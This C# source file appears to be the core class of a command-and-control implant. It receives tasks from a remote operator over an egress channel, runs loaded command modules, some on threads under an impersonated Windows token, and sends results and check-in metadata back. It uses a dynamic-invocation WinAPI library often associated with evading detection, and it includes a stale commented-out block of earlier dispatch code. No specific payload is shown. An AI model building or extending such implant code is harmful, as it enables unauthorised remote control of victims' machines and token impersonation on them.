using Agent.Commands;
using Agent.Communication;
using Agent.Service;
using Shared;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using WinAPI.DInvoke;
using BinarySerializer;

namespace Agent
{
    public class Agent
    {
        private EgressCommunicator EgressCommunicator { get; set; }
        private IConfigService _configService;
        private INetworkService _networkService;
        private IFileService _fileService;
        //private IProxyService _proxyService;
        public AgentMetadata MetaData { get; protected set; }

        private readonly Dictionary<string, CancellationTokenSource> _taskTokens = new Dictionary<string, CancellationTokenSource>();

        private CancellationTokenSource _tokenSource = new CancellationTokenSource();

        private List<AgentCommand> _commands = new List<AgentCommand>();

        private IntPtr _impersonationToken;
        public IntPtr ImpersonationToken
        {
            get => _impersonationToken;
            set
            {
                // ensure the handle is closed first
                if (_impersonationToken != IntPtr.Zero)
                    Kernel32.CloseHandle(_impersonationToken);

                _impersonationToken = value;
            }
        }

        public void LoadCommands()
        {
            var self = Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)) && !type.ContainsGenericParameters)
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    _commands.Add(instance);
                }
            }

        }

        internal Agent(AgentMetadata metadata, EgressCommunicator communicator)
        {
            this.MetaData = metadata;
            this.EgressCommunicator = communicator;
            this._networkService = ServiceProvider.GetService<INetworkService>();
            this._fileService = ServiceProvider.GetService<IFileService>();
            //this._proxyService = ServiceProvider.GetService<IProxyService>();
            this._configService = ServiceProvider.GetService<IConfigService>();

            LoadCommands();


            communicator.Agent = this;
        }

        public void Run()
        {
            Thread commThread = new Thread(this.EgressCommunicator.Start);
            commThread.Start(this._tokenSource);

            try
            {
                while (!_tokenSource.IsCancellationRequested)
                {
                    this.HandleFrames().Wait();
                    Thread.Sleep(10);
                }
            }
            catch(Exception ex)
            {
#if DEBUG
                Console.WriteLine(ex.ToString());
#endif
                this.Stop();
            }
        }

        public void Stop()
        {
            this._tokenSource.Cancel();
        }

        private async Task HandleFrames()
        {
            //frames to handle for this agent
            var frames = this._networkService.GetFrames(this.MetaData.Id);
            foreach (var frame in frames)
                await this.HandleFrame(frame);
               
        }

        private async Task HandleFrame(NetFrame frame)
        {
            switch(frame.FrameType)
            {
                case NetFrameType.CheckIn:
                case NetFrameType.TaskResult:
                    break;

                case NetFrameType.Task:
                    {
                        var task = await frame.Data.BinaryDeserializeAsync<AgentTask>();
                        await HandleTask(task);
                        break;
                    }

                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private async Task HandleTask(AgentTask task)
        {
            // get the command
            var command = this._commands.FirstOrDefault(c => c.Command == task.CommandId);


            if (command is null)
            {
                AgentTaskResult res = new AgentTaskResult();
                res.Id = task.Id;
                res.Output = $"Agent has no {task.CommandId} command registered!";
                res.Status = AgentResultStatus.Completed;
                await this.SendTaskResult(res);

                return;
            }

            // execute
            if (command.Threaded) ExecuteTaskThreaded(command, task);
            else await ExecuteTask(command, task);
        }

        private async Task ExecuteTask(AgentCommand command, AgentTask task)
        {
            var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
            var ctxt = new AgentCommandContext()
            {
                ParentContext = null,
                Agent = this,
                NetworkService = _networkService,
                FileService = _fileService,
                //ProxyService = _proxyService,
                ConfigService = _configService,
                Result = new AgentTaskResult(),
            };
            await clone.Execute(task, ctxt, CancellationToken.None);
        }

        private void ExecuteTaskThreaded(AgentCommand command, AgentTask task)
        {
            // create a new token
            var tokenSource = new CancellationTokenSource();

            // add to dict
            _taskTokens.Add(task.Id, tokenSource);

            // get the current identity
            using (var identity = ImpersonationToken == IntPtr.Zero
                ? WindowsIdentity.GetCurrent()
                : new WindowsIdentity(ImpersonationToken))
            {

                // create impersonation context
                using (var context = identity.Impersonate())
                {

                    var thread = new Thread(async () =>
                    {
                        //try
                        //{
                            // this blocks inside the thread
                            var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
                            var ctxt = new AgentCommandContext()
                            {
                                ParentContext = null,
                                Agent = this,
                                NetworkService = _networkService,
                                FileService = _fileService,
                                //ProxyService = _proxyService,
                                ConfigService = _configService,
                                Result = new AgentTaskResult(),
                            };
                            await clone.Execute(task, ctxt, tokenSource.Token);

                        //}
                        //catch (TaskCanceledException)
                        //{
                        //    await SendTaskComplete(task.Id);
                        //}
                        //catch (ThreadAbortException)
                        //{
                        //    await SendTaskComplete(task.Id);
                        //}
                        //catch (OperationCanceledException)
                        //{
                        //    await SendTaskComplete(task.Id);
                        //}
                        //catch (Exception e)
                        //{
                        //    await SendTaskError(task.Id, e.Message);
                        //}
                        //finally
                        //{
                            // make sure the token is disposed and removed
                            if (_taskTokens.ContainsKey(task.Id))
                            {
                                _taskTokens[task.Id].Dispose();
                                _taskTokens.Remove(task.Id);
                            }
                        //}
                    });


                    // run thread
                    thread.Start();
                }
            }
        }

        public async Task SendMetaData()
        {
            var frame = new NetFrame(this.MetaData.Id, NetFrameType.CheckIn, await this.MetaData.BinarySerializeAsync());
            this._networkService.EnqueueFrame(frame);
        }

        public async Task SendTaskResult(AgentTaskResult result)
        {
            var frame = new NetFrame(this.MetaData.Id, NetFrameType.TaskResult, await result.BinarySerializeAsync());
            this._networkService.EnqueueFrame(frame);
        }

        public async Task SendTaskError(string taskId, string errorMessage)
        {
            var result = new AgentTaskResult()
            {
                Id = taskId,
                Error = errorMessage,
                Status = AgentResultStatus.Error,
            };
            await SendTaskResult(result);
        }

        public async Task SendTaskComplete(string taskId)
        {
            var result = new AgentTaskResult()
            {
                Id = taskId,
                Status = AgentResultStatus.Completed,
            };
            await SendTaskResult(result);
        }

        /*public Thread HandleTask(AgentTask task, AgentTaskResult res = null, AgentCommandContext parent = null)
        {
            var tr = new TaskAndResult
            {
                Task = task,
                Result = res ?? new AgentTaskResult(),
                ParentCtxt = parent
            };

            if (ImpersonationHelper.HasCurrentImpersonation)
            {
                //Console.WriteLine($"run command {task.Command} impersonnated");
                using (var context = WindowsIdentity.Impersonate(ImpersonationHelper.ImpersonatedToken))
                {
                    return StartTaskAsNewThread(tr);
                }
            }
            else
            {
                //Console.WriteLine($"run command {task.Command} not impersonnated");
                return StartTaskAsNewThread(tr);
            }
        }

        private Thread StartTaskAsNewThread(TaskAndResult tr)
        {
            Thread t = new Thread(this.StartHandleTask);
            t.Start(tr);
            return t;
        }

        public class TaskAndResult
        {
            public AgentTask Task { get; set; }
            public AgentTaskResult Result { get; set; }
            public AgentCommandContext ParentCtxt { get; set; }
        }

        private void StartHandleTask(object taskandResult)
        {

            this.HandleTaskInternal(taskandResult as TaskAndResult);
        }

        private Task HandleTaskInternal(TaskAndResult tr)
        {
            var command = this._commands.FirstOrDefault(c => c.Command == tr.Task.CommandId);

            AgentTaskResult result = null;

            if (command is null)
            {
                tr.Result.Id = tr.Task.Id;
                tr.Result.Result = $"Agent has no {tr.Task.Command} command registered!";
                tr.Result.Status = AgentResultStatus.Completed;
                this._messageService.SendResult(result);
            }
            else
            {
                var clone = Activator.CreateInstance(command.GetType()) as AgentCommand;
                var ctxt = new AgentCommandContext()
                {
                    ParentContext = tr.ParentCtxt,
                    Agent = this,
                    MessageService = _messageService,
                    FileService = _fileService,
                    ProxyService = _proxyService,
                    ConfigService = _configService,
                    Result = tr.Result,
                };
                await clone.Execute(tr.Task, ctxt);
            }
        }*/
    }
}
